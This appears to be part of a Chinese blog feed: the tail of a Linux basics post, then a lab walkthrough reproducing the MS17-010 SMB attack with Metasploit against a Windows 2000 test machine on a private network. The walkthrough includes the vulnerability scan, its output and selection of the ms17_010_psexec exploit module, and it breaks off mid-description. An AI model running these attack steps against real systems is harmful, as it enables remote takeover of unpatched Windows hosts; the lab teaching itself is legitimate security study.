<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ sudo rm -rf ./223333
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车后会要你输入一次密码，输入密码后按回车，这个文件就删除了，Linux的安全保护机制使密码不会显示在屏幕上</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> weepingdogel 的密码：
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ ls -lh <span class="c1"># 查看一下文件的情况，可见这个文件不见了</span>
</span></span><span class="line"><span class="cl">总用量 <span class="m">0</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> weepingdogel weepingdogel <span class="m">40</span>  8月  <span class="m">5</span> 19:07 d
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> weepingdogel weepingdogel <span class="m">40</span>  8月  <span class="m">5</span> 17:52 <span class="nb">test</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">0</span>  8月  <span class="m">5</span> 17:52 wiaori
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="包管理器">包管理器</h2>
<blockquote>
<p>注意：不同发行版之间可能有差异</p>
</blockquote>
<p>一般情况下，新手使用的<strong>deb系发行版</strong>的包管理器是<strong>apt</strong></p>
<p>那么这些就是<strong>apt</strong>常用的用法了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost ~<span class="o">]</span>$ sudo apt-get update <span class="c1"># 更新软件源</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ sudo apt-get install &lt;包名&gt; <span class="c1"># 安装一个软件、软件包</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ sudo apt-get search &lt;软件名称&gt; <span class="c1"># 搜索软件</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ sudo apt-get upgrade <span class="c1"># 升级你已安装的软件，通常消耗时间比较长</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ sudo apt-get remove &lt;包名&gt; <span class="c1"># 卸载软件</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ sudo apt-get autoremove <span class="c1"># 自动处理依赖</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">如果要安装本地包，则需要使用本地包管理器dpkg，用法如下
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ sudo dpkg -i &lt;包名&gt; <span class="c1"># 安装本地包</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="结语">结语</h2>
<p>本期博客中的内容并不是很详细，我已经尽力写得让大多数人能看懂，也许还有少数人无法理解内容，没关系，你可以在下面的评论区提问。</p>
<p>那么，欢迎评论。</p>
]]></description>
</item><item>
    <title>震惊！16岁男子竟然在家里做出这种事！</title>
    <link>http://weepingdogel.github.io/posts/%E9%9C%87%E6%83%8A16%E5%B2%81%E7%94%B7%E5%AD%90%E7%AB%9F%E7%84%B6%E5%9C%A8%E5%AE%B6%E9%87%8C%E5%81%9A%E5%87%BA%E8%BF%99%E7%A7%8D%E4%BA%8B/</link>
    <pubDate>Fri, 26 Jul 2019 22:52:54 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/%E9%9C%87%E6%83%8A16%E5%B2%81%E7%94%B7%E5%AD%90%E7%AB%9F%E7%84%B6%E5%9C%A8%E5%AE%B6%E9%87%8C%E5%81%9A%E5%87%BA%E8%BF%99%E7%A7%8D%E4%BA%8B/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/images/wallhaven-j5j5vm.jpg" referrerpolicy="no-referrer">
            </div><h2 id="简介">简介</h2>
<p>该男子居然在家做出这种事情，使多数人震惊！</p>
<h2 id="这才是真正的简介">这才是真正的简介</h2>
<p>哈哈，上面那个是假的，本篇博客将会复现MS17-010漏洞攻击。</p>
<h3 id="ms17-010是啥啊">MS17-010是啥啊？</h3>
<p>你是否记得2017年的那个勒索病毒？就是不给钱就把你电脑里所有的AV加密起来的一个病毒。是不是很可怕？这个病毒就是通过这个漏洞让更多的人看不到AV的。</p>
<ul>
<li>那这个漏洞是怎样的呢？我将给出以下链接用于参考：</li>
</ul>
<blockquote>
<p><a href="https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2017/ms17-010" target="_blank" rel="noopener noreffer">Microsoft 安全公告 MS17-010 - 严重</a></p>
<p><a href="https://cvedetails.com/cve/CVE-2017-0143/" target="_blank" rel="noopener noreffer">https://cvedetails.com/cve/CVE-2017-0143/</a></p>
<p><a href="https://cvedetails.com/cve/CVE-2017-0144/" target="_blank" rel="noopener noreffer">https://cvedetails.com/cve/CVE-2017-0144/</a></p>
<p><a href="https://cvedetails.com/cve/CVE-2017-0145/" target="_blank" rel="noopener noreffer">https://cvedetails.com/cve/CVE-2017-0145/</a></p>
<p><a href="https://cvedetails.com/cve/CVE-2017-0146/" target="_blank" rel="noopener noreffer">https://cvedetails.com/cve/CVE-2017-0146/</a></p>
<p><a href="https://cvedetails.com/cve/CVE-2017-0147/" target="_blank" rel="noopener noreffer">https://cvedetails.com/cve/CVE-2017-0147/</a></p>
<p><a href="https://cvedetails.com/cve/CVE-2017-0148/" target="_blank" rel="noopener noreffer">https://cvedetails.com/cve/CVE-2017-0148/</a></p>
<p><a href="https://github.com/RiskSense-Ops/MS17-010" target="_blank" rel="noopener noreffer">https://github.com/RiskSense-Ops/MS17-010</a></p>
</blockquote>
<h2 id="攻击复现">攻击复现</h2>
<p>那么，我们来复现一下这个漏洞的攻击流程吧。在这里，我给大家安利一个<a href="https://baike.baidu.com/item/linux/27050?fr=aladdin" target="_blank" rel="noopener noreffer">Linux</a>的渗透测试软件包。叫做<strong>Metasploit</strong>。 它在作为<strong>渗透测试的发行版</strong>中是自带的，如果你用的不是<strong>作为渗透测试的发行版</strong>，那么以下是安装方法：</p>
<ul>
<li>基于Arch</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S metasploit
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>基于Debian更新源里有的</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo apt-get install metasploit
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>rpm系或deb系源里没有的</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo chmod <span class="m">755</span> msfinstall <span class="o">&amp;&amp;</span> ./msfinstall
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>Windows嘛….</li>
</ul>
<blockquote>
<p>两个选择</p>
<ul>
<li>请到<a href="https://www.metasploit.com/" target="_blank" rel="noopener noreffer">MSF官网</a>下载，并且耐心等待。</li>
<li><a href="/posts/linux_mint_%e5%ae%89%e8%a3%85%e6%95%99%e7%a8%8b/" rel="">出门左转</a>安装Linux</li>
</ul>
</blockquote>
<h2 id="复现过程">复现过程</h2>
<blockquote>
<p>重要的事情说三遍：</p>
<p>接下来就是最重要的一部分，你一定要认真看！认真看！认真看！</p>
</blockquote>
<h3 id="攻击环境">攻击环境</h3>
<table>
<thead>
<tr>
<th style="text-align:center"></th>
<th style="text-align:center">攻击机</th>
<th style="text-align:center">靶机</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">操作系统</td>
<td style="text-align:center">Arch Linux</td>
<td style="text-align:center">Windows2K</td>
</tr>
<tr>
<td style="text-align:center">IP地址</td>
<td style="text-align:center">192.168.42.141</td>
<td style="text-align:center">192.168.42.252</td>
</tr>
</tbody>
</table>
<p>靶机截图:</p>
<p></p>
<h3 id="攻击过程">攻击过程</h3>
<p>首先，攻击机打开终端，输入 <strong><code>msfconsole</code></strong> ，并按回车等待。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo msfconsole
</span></span></code></pre></td></tr></table>
</div>
</div><p>建议加上<code>sudo</code>，以免出现未知错误。</p>
<p>稍等片刻，metasploit就打开了。如图</p>
<p></p>
<p>接下来，通过 <strong><code>search</code></strong> 命令本次要利用到的MS17_010模块</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 &gt; search ms17_010
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后就跳出一大堆</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Matching Modules
</span></span><span class="line"><span class="cl">================
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   #  Name                                           Disclosure Date  Rank     Check  Description
</span></span><span class="line"><span class="cl">   -  ----                                           ---------------  ----     -----  -----------
</span></span><span class="line"><span class="cl">   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
</span></span><span class="line"><span class="cl">   1  auxiliary/scanner/smb/smb_ms17_010                              normal   Yes    MS17-010 SMB RCE Detection
</span></span><span class="line"><span class="cl">   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
</span></span><span class="line"><span class="cl">   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
</span></span><span class="line"><span class="cl">   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
</span></span></code></pre></td></tr></table>
</div>
</div><p>嘛，我们先检测一下靶机是否存在这个漏洞，选第二个漏洞检测模块。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010
</span></span></code></pre></td></tr></table>
</div>
</div><hr>
<blockquote>
<p>顺便一提，metasploit是一款渗透测试工具，如果你想了解这些模块是怎么运作的，那么你要掌握这几条命令：</p>
<ol>
<li>search</li>
</ol>
<ul>
<li>用于搜素模块，然后列出这个模块使用方式，如上面演示的一样。</li>
</ul>
<ol start="2">
<li>info</li>
</ol>
<ul>
<li>显示该模块的详细信息。</li>
</ul>
<ol start="3">
<li>show + [option]</li>
</ol>
<ul>
<li>显示该模块的部分信息。</li>
</ul>
<ol start="4">
<li>show options</li>
</ol>
<ul>
<li>显示该模块需要设置的项目</li>
</ul>
<ol start="5">
<li>show payloads</li>
</ol>
<ul>
<li>显示该模块可使用的攻击载荷</li>
</ul>
<p><strong>注意，第三条和第四条不要搞混了，第二条那个[option]是指代。</strong></p>
</blockquote>
<hr>
<p>回归正题，我们先看看这个模块的信息。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 auxiliary<span class="o">(</span>scanner/smb/smb_ms17_010<span class="o">)</span> &gt; info
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后又出了一大堆qwq…</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">    Name: MS17-010 SMB RCE Detection
</span></span><span class="line"><span class="cl">     Module: auxiliary/scanner/smb/smb_ms17_010
</span></span><span class="line"><span class="cl">    License: Metasploit Framework License (BSD)
</span></span><span class="line"><span class="cl">       Rank: Normal
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Provided by:
</span></span><span class="line"><span class="cl">  Sean Dillon &lt;sean.dillon@risksense.com&gt;
</span></span><span class="line"><span class="cl">  Luke Jennings
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Check supported:
</span></span><span class="line"><span class="cl">  Yes
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Basic options:
</span></span><span class="line"><span class="cl">  Name         Current Setting                                 Required  Description
</span></span><span class="line"><span class="cl">  ----         ---------------                                 --------  -----------
</span></span><span class="line"><span class="cl">  CHECK_ARCH   true                                            no        Check for architecture on vulnerable hosts
</span></span><span class="line"><span class="cl">  CHECK_DOPU   true                                            no        Check for DOUBLEPULSAR on vulnerable hosts
</span></span><span class="line"><span class="cl">  CHECK_PIPE   false                                           no        Check for named pipe on vulnerable hosts
</span></span><span class="line"><span class="cl">  NAMED_PIPES  /opt/metasploit/data/wordlists/named_pipes.txt  yes       List of named pipes to check
</span></span><span class="line"><span class="cl">  RHOSTS                                                       yes       The target address range or CIDR identifier
</span></span><span class="line"><span class="cl">  RPORT        445                                             yes       The SMB service port (TCP)
</span></span><span class="line"><span class="cl">  SMBDomain    .                                               no        The Windows domain to use for authentication
</span></span><span class="line"><span class="cl">  SMBPass                                                      no        The password for the specified username
</span></span><span class="line"><span class="cl">  SMBUser                                                      no        The username to authenticate as
</span></span><span class="line"><span class="cl">  THREADS      1                                               yes       The number of concurrent threads
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Description:
</span></span><span class="line"><span class="cl">  Uses information disclosure to determine if MS17-010 has been 
</span></span><span class="line"><span class="cl">  patched or not. Specifically, it connects to the IPC$ tree and 
</span></span><span class="line"><span class="cl">  attempts a transaction on FID 0. If the status returned is 
</span></span><span class="line"><span class="cl">  &#34;STATUS_INSUFF_SERVER_RESOURCES&#34;, the machine does not have the 
</span></span><span class="line"><span class="cl">  MS17-010 patch. If the machine is missing the MS17-010 patch, the 
</span></span><span class="line"><span class="cl">  module will check for an existing DoublePulsar (ring 0 
</span></span><span class="line"><span class="cl">  shellcode/malware) infection. This module does not require valid SMB 
</span></span><span class="line"><span class="cl">  credentials in default server configurations. It can log on as the 
</span></span><span class="line"><span class="cl">  user &#34;\&#34; and connect to IPC$.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">References:
</span></span><span class="line"><span class="cl">  https://cvedetails.com/cve/CVE-2017-0143/
</span></span><span class="line"><span class="cl">  https://cvedetails.com/cve/CVE-2017-0144/
</span></span><span class="line"><span class="cl">  https://cvedetails.com/cve/CVE-2017-0145/
</span></span><span class="line"><span class="cl">  https://cvedetails.com/cve/CVE-2017-0146/
</span></span><span class="line"><span class="cl">  https://cvedetails.com/cve/CVE-2017-0147/
</span></span><span class="line"><span class="cl">  https://cvedetails.com/cve/CVE-2017-0148/
</span></span><span class="line"><span class="cl">  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
</span></span><span class="line"><span class="cl">  https://zerosum0x0.blogspot.com/2017/04/doublepulsar-initial-smb-backdoor-ring.html
</span></span><span class="line"><span class="cl">  https://github.com/countercept/doublepulsar-detection-script
</span></span><span class="line"><span class="cl">  https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Also known as:
</span></span><span class="line"><span class="cl">  DOUBLEPULSAR
</span></span><span class="line"><span class="cl">  ETERNALBLUE
</span></span></code></pre></td></tr></table>
</div>
</div><p>然而这里我们只需要看那个<strong>Basic options</strong>部分就可以了，那两行有yes的，我们就知道了，我们需要指定一个<strong>目标IP(RHOST)</strong>，而那个 <strong>RPORT(目标端口)</strong> 已经被指定为445了。</p>
<p>接下来执行…</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 auxiliary<span class="o">(</span>scanner/smb/smb_ms17_010<span class="o">)</span> &gt; <span class="nb">set</span> rhost 192.168.42.252
</span></span><span class="line"><span class="cl">msf5 auxiliary<span class="o">(</span>scanner/smb/smb_ms17_010<span class="o">)</span> &gt; run
</span></span></code></pre></td></tr></table>
</div>
</div><p>返回后我们得到了这些</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 192.168.42.252:445    - Host is likely VULNERABLE to MS17-010! - Windows 5.0 x86 <span class="o">(</span>32-bit<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445    - Scanned <span class="m">1</span> of <span class="m">1</span> hosts <span class="o">(</span>100% <span class="nb">complete</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Auxiliary module execution completed
</span></span></code></pre></td></tr></table>
</div>
</div><p>
说明目标是存在MS17_010漏洞的，那么我们接下来将要使用的是攻击模块，也就是上面搜索到的最后一个。</p>
<blockquote>
<p>exploit/windows/smb/ms17_010_psexec</p>
</blockquote>
<p>那么，执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 auxiliary<span class="o">(</span>scanner/smb/smb_ms17_010<span class="o">)</span> &gt; use exploit/windows/smb/ms17_010_psexec
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来msf5后面的模块就变成了攻击模块了。

然后继续执行info，没错，又会弹出一大堆。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>windows/smb/ms17_010_psexec<span class="o">)</span> &gt; info
</span></span></code></pre></td></tr></table>
</div>
</div><p>对，就是下面这一大堆。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">       Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
</span></span><span class="line"><span class="cl">     Module: exploit/windows/smb/ms17_010_psexec
</span></span><span class="line"><span class="cl">   Platform: Windows
</span></span><span class="line"><span class="cl">       Arch: x86, x64
</span></span><span class="line"><span class="cl"> Privileged: No
</span></span><span class="line"><span class="cl">    License: Metasploit Framework License (BSD)
</span></span><span class="line"><span class="cl">       Rank: Normal
</span></span><span class="line"><span class="cl">  Disclosed: 2017-03-14
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Provided by:
</span></span><span class="line"><span class="cl">  sleepya
</span></span><span class="line"><span class="cl">  zerosum0x0
</span></span><span class="line"><span class="cl">  Shadow Brokers
</span></span><span class="line"><span class="cl">  Equation Group
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Available targets:
</span></span><span class="line"><span class="cl">  Id  Name
</span></span><span class="line"><span class="cl">  --  ----
</span></span><span class="line"><span class="cl">  0   Automatic
</span></span><span class="line"><span class="cl">  1   PowerShell
</span></span><span class="line"><span class="cl">  2   Native upload
</span></span><span class="line"><span class="cl">  3   MOF upload
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Check supported:
</span></span><span class="line"><span class="cl">  Yes
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Basic options:
</span></span><span class="line"><span class="cl">  Name                  Current Setting                                 Required  Description
</span></span><span class="line"><span class="cl">  ----                  ---------------                                 --------  -----------
</span></span><span class="line"><span class="cl">  DBGTRACE              false                                           yes       Show extra debug trace info
</span></span><span class="line"><span class="cl">  LEAKATTEMPTS          99                                              yes       How many times to try to leak transaction
</span></span><span class="line"><span class="cl">  NAMEDPIPE                                                             no        A named pipe that can be connected to (leave blank for auto)
</span></span><span class="line"><span class="cl">  NAMED_PIPES           /opt/metasploit/data/wordlists/named_pipes.txt  yes       List of named pipes to check
</span></span><span class="line"><span class="cl">  RHOSTS                                                                yes       The target address range or CIDR identifier
</span></span><span class="line"><span class="cl">  RPORT                 445                                             yes       The Target port
</span></span><span class="line"><span class="cl">  SERVICE_DESCRIPTION                                                   no        Service description to to be used on target for pretty listing
</span></span><span class="line"><span class="cl">  SERVICE_DISPLAY_NAME                                                  no        The service display name
</span></span><span class="line"><span class="cl">  SERVICE_NAME                                                          no        The service name
</span></span><span class="line"><span class="cl">  SHARE                 ADMIN$                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
</span></span><span class="line"><span class="cl">  SMBDomain             .                                               no        The Windows domain to use for authentication
</span></span><span class="line"><span class="cl">  SMBPass                                                               no        The password for the specified username
</span></span><span class="line"><span class="cl">  SMBUser                                                               no        The username to authenticate as
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Payload information:
</span></span><span class="line"><span class="cl">  Space: 3072
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Description:
</span></span><span class="line"><span class="cl">  This module will exploit SMB with vulnerabilities in MS17-010 to 
</span></span><span class="line"><span class="cl">  achieve a write-what-where primitive. This will then be used to 
</span></span><span class="line"><span class="cl">  overwrite the connection session information with as an 
</span></span><span class="line"><span class="cl">  Administrator session. From there, the normal psexec payload code 
</span></span><span class="line"><span class="cl">  execution is done. Exploits a type confusion between Transaction and 
</span></span><span class="line"><span class="cl">  WriteAndX requests and a race condition in Transaction requests, as 
